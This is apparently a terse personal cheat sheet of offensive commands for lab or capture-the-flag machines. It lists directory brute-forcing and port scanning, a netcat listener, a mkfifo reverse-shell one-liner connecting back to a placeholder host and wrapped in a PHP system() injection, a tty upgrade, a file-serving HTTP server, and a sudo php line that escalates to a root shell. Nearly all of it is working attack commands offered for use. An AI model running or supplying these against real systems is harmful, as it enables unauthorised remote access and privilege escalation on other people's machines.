gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
nmap -sC -sV -Pn <IP>
msfconsole
	show options, shelll
nc -lvnp 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 1234 >/tmp/f  -> <?php system (xxx); ?>
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -m http.server 8000 

CMD="/bin/sh"
sudo php -r "system('$CMD');"

